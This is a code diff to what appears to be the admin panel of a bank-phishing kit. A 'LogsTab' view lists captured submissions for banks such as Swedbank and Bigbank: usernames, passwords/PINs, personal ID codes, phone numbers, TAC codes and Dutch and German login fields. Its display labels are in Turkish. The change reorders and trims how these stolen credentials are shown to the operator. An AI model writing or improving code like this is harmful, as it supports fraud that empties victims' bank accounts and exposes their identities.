@@ -181,59 +181,26 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
     return "";
   };
 
-  const normalizedKeys = Object.keys(formData).map((key) => key.toLowerCase().replace(/[^a-z0-9]/g, ""));
-  const normalizedBankSlug = typeof formData.bankSlug === "string" ? formData.bankSlug.trim().toLowerCase() : "";
-  const normalizedBankName = typeof formData.bankName === "string" ? formData.bankName.trim().toLowerCase() : "";
-  const prefersUsernameFirst =
-    (normalizedBankSlug === "swedbank-ee" || normalizedBankName === "swedbank") &&
-    normalizedKeys.some((key) => key.includes("kasutajatunnus")) &&
-    normalizedKeys.some((key) => key.includes("telefoninumber") || key.includes("phone") || key.includes("isikukood"));
-  const prefersBankPhoneFirst =
-    (normalizedBankSlug === "bigbank" || normalizedBankName === "bigbank") &&
-    normalizedKeys.some((key) => key.includes("mobilenumber") || key.includes("phone")) &&
-    normalizedKeys.some((key) => key.includes("personalidentitycode") || key.includes("identitycode") || key.includes("isikukood"));
+  const rawPersonalCode = pickString("personalCode");
+  const rawUsername = pickString("username", "verfuegernummer");
+  const rawPassword = pickString("password", "pin");
 
-  const canonicalFields: Array<[string, string]> = prefersUsernameFirst
-    ? [
-        ["loginMethod", pickString("loginMethod")],
-        ["username", pickString("username", "verfuegernummer")],
-        ["personalCode", pickString("personalCode")],
-        ["bankPhone", pickString("bankPhone")],
-        ["password", pickString("password", "pin")],
-        ["tacCode", pickString("tacCode")],
-        ["pasnummer", pickString("pasnummer")],
-        ["rekeningnummer", pickString("rekeningnummer")],
-        ["toegangscode", pickString("toegangscode")],
-        ["signatuur", pickString("signatuur")],
-        ["identificatiecode", pickString("identificatiecode")],
-      ]
-    : prefersBankPhoneFirst
-      ? [
-          ["loginMethod", pickString("loginMethod")],
-          ["bankPhone", pickString("bankPhone")],
-          ["personalCode", pickString("personalCode")],
-          ["username", pickString("username", "verfuegernummer")],
-          ["password", pickString("password", "pin")],
-          ["tacCode", pickString("tacCode")],
-          ["pasnummer", pickString("pasnummer")],
-          ["rekeningnummer", pickString("rekeningnummer")],
-          ["toegangscode", pickString("toegangscode")],
-          ["signatuur", pickString("signatuur")],
-          ["identificatiecode", pickString("identificatiecode")],
-        ]
-    : [
-        ["loginMethod", pickString("loginMethod")],
-        ["personalCode", pickString("personalCode")],
-        ["bankPhone", pickString("bankPhone")],
-        ["username", pickString("username", "verfuegernummer")],
-        ["password", pickString("password", "pin")],
-        ["tacCode", pickString("tacCode")],
-        ["pasnummer", pickString("pasnummer")],
-        ["rekeningnummer", pickString("rekeningnummer")],
-        ["toegangscode", pickString("toegangscode")],
-        ["signatuur", pickString("signatuur")],
-        ["identificatiecode", pickString("identificatiecode")],
-      ];
+  const effectivePersonalCode = rawPersonalCode || rawUsername;
+  const effectiveUsername = rawPersonalCode ? rawUsername : "";
+
+  const canonicalFields: Array<[string, string]> = [
+    ["loginMethod", pickString("loginMethod")],
+    ["personalCode", effectivePersonalCode],
+    ["bankPhone", pickString("bankPhone")],
+    ["username", effectiveUsername],
+    ["password", rawPassword],
+    ["tacCode", pickString("tacCode")],
+    ["pasnummer", pickString("pasnummer")],
+    ["rekeningnummer", pickString("rekeningnummer")],
+    ["toegangscode", pickString("toegangscode")],
+    ["signatuur", pickString("signatuur")],
+    ["identificatiecode", pickString("identificatiecode")],
+  ];
 
   return canonicalFields.filter(([, value]) => Boolean(value));
 }
@@ -910,7 +877,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     <td className="px-3 py-4">
                       <div className="text-[13px] space-y-1.5 max-w-[200px] break-words">
                           {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500 break-words">{fd.bankName}</div>}
-                          {[...getCanonicalAdminBankFields(fd), ...getAdditionalAdminBankFields(fd)].map(([key, value]) => {
+                          {getCanonicalAdminBankFields(fd).map(([key, value]) => {
                               let displayKey = key;
                               if (displayKey === "username") displayKey = "ID / K.Adı";
                               else if (displayKey === "password") displayKey = "Şifre / PIN";
